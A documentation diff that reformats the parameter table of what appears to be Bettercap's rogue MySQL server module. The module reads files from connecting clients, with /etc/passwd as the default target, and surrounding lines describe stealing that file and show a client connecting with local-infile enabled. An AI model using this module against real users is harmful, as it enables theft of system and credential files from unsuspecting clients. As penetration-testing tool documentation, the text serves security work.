@@ -19,13 +19,13 @@ Stop mysql server.
 
 ### Parameters
 
-| parameter | default | description |
-|-----------|---------|-------------|
-| `mysql.server.infile` | `/etc/passwd` | File you want to read. UNC paths are also supported. | 
-| `mysql.server.outfile` | | If filled, the INFILE buffer will be saved to this path instead of being logged. |
-| `mysql.server.address` |  `<interface address>` | Address to bind the mysql server to. |
-| `mysql.server.port` | `3306` | Port to bind the mysql server to. |
-| `mysql.server.outfile` | If filled, the INFILE buffer will be saved to this path instead of being logged. | 
+| Parameter              | Default                                                                          | Description                                                                      |
+| ---------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
+| `mysql.server.infile`  | `/etc/passwd`                                                                    | File you want to read. UNC paths are also supported.                             |
+| `mysql.server.outfile` |                                                                                  | If filled, the INFILE buffer will be saved to this path instead of being logged. |
+| `mysql.server.address` | `<interface address>`                                                            | Address to bind the mysql server to.                                             |
+| `mysql.server.port`    | `3306`                                                                           | Port to bind the mysql server to.                                                |
+| `mysql.server.outfile` | If filled, the INFILE buffer will be saved to this path instead of being logged. |
 
 **Examples**
 
@@ -36,4 +36,3 @@ One liner to start the server and steal /etc/passwd from clients connecting to y
 Now connect to your MySQL server and observe the file output on the Bettercap terminal
 
     $ mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile
-
